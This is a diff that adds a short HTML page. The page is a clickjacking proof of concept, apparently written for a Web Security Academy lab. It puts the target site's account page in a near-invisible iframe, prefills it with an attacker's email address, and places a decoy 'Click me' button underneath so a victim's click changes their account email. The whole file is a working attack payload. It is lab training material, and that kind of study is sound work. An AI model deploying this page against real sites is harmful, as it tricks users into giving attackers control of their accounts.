@@ -1,0 +1,32 @@
+<head>
+    <style>
+        #target_website {
+            position:relative;
+            width:200px;
+            height:600px;
+            opacity:0.00001;
+            z-index:2;
+            }
+        #decoy_website {
+            position:absolute;
+            width:300px;
+            height:400px;
+            z-index:1;
+            }
+        #button {
+          text-align: center;
+          display: inline-block;
+          font-size: 16px;
+          margin: 455px 50px;
+          width: 100px;
+          height: 30px;
+        }
+    </style>
+</head>
+<body>
+<div id="decoy_website">
+    <button id="button">Click me</button>
+</div>
+<iframe id="target_website" sandbox="allow-forms" src="https://???.web-security-academy.net/my-account?email=victim@attacker-website.com">
+</iframe>
+</body>
